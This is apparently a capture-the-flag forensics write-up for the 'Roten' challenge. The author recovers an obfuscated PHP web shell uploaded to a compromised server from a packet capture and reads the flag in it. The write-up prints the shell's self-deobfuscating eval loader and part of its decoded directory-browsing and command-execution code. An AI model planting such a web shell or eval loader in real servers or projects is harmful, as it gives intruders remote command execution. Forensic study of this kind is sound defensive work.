# Cyber Apocalypse 2023

## Roten

> The iMoS is responsible for collecting and analyzing targeting data across various galaxies. The data is collected through their webserver, which is accessible to authorized personnel only. However, the iMoS suspects that their webserver has been compromised, and they are unable to locate the source of the breach. They suspect that some kind of shell has been uploaded, but they are unable to find it. The iMoS have provided you with some network data to analyse, its up to you to save us.
>
>  Author: N/A
>
> [`forensics_roten.zip`](forensics_roten.zip)

Tags: _forensics_

## Solution
A wireshark capture accompanies that challenge. Browsing the capture one can fine a huge amount of requests to `galacticmap.php`. Next we search the packet where galacticmap.php was uploaded to get the code.

```php
$iyzQ5h8qf6 .= "\\o>\n u]d> wd ;  Gaoe : ettsssn\"= \$   \$t\$4: lewf l;]e% 'L c'capt a maaOFre mF <'  hnv\n {e >< n>\"\n  Ednn   aets.t.c  m{ \$oem0  d\"n('d\n,a1 ]L h/hce'vveemlS"; 
$iyzQ5h8qf6 .= "Ie }pi'b<ee <e  \n).<t l\" }  Tett m dsp\"c cof o  mw\"o)' []e s[  ds )  o'ot= abn=euTLca\n_l.r/cx(br   ) td o..\n  [re- u ft:>oconi d\$ on]d - "; 
$iyzQ5h8qf6 .= "\" r\$'' \$'% )oe . i'nlac'=e[Etl ne\$>bhe\$r    )\"d> a  e  '(nD s i /\nmomtl et de e?' w=[m e o]1  rc\$\$\"ohaurtd'='Sor a d<>occ>t <  ?>  dppc  d"; 
$iyzQ5h8qf6 .= "'ti t lc/\n/m/ae  y er=  ; r \"o:x w,s { hfv<nime-yif's[re m'ib< (m\"a / {d\"\" =orh  oC-s -heom<apbip &p  [ &'\n i(ed e n % \n!oiah=de=fpriUu'ya e.r b\"'d;b t"; 
$iyzQ5h8qf6 .= " \ni.  \"sio  woTp re(ma!jionee e &\"( r \$t\$xe'c e\$1  i ll2'd='oe'lpbf)d '\$.sr<cr\nl h  r . .in   "; 
for($i = 0; $i < $pPziZoJiMpcu; $i++) $liGBOKxsOGMz[] = ""; 
for($i = 0; $i < (strlen($iyzQ5h8qf6) / $pPziZoJiMpcu); $i++) { for($r = 0; $r < $pPziZoJiMpcu; $r++) $liGBOKxsOGMz[$r] .= $iyzQ5h8qf6[$r + $i * $pPziZoJiMpcu]; } 
$bhrTeZXazQ = trim(implode("", $liGBOKxsOGMz)); 
$bhrTeZXazQ = "?>$bhrTeZXazQ"; 
eval( $bhrTeZXazQ ); 
```

Its obfuscated of course, but the script deobfuscates itself. After replacing the `eval` at the bottom with an echo we get the readable script. And sure enough, somewhere down the road we find a comment...

```php
$file = '';
if ($dir == NULL or !is_dir($dir)) {
        if (is_file($dir)) {
                echo "enters";
                $file = $dir;
                echo $file;
        }
        $dir = './';
}
$dir = realpath($dir.'/'.$value);
##flag = HTB{W0w_ROt_A_DaY}
$dirs = scandir($dir);
echo "<h2>Viewing directory " . $dir . "</h2>";
echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
echo "<input type='hidden' name='dir' value=".$dir." />";
echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
echo "</form>";
```

... with the flag `HTB{W0w_ROt_A_DaY}`.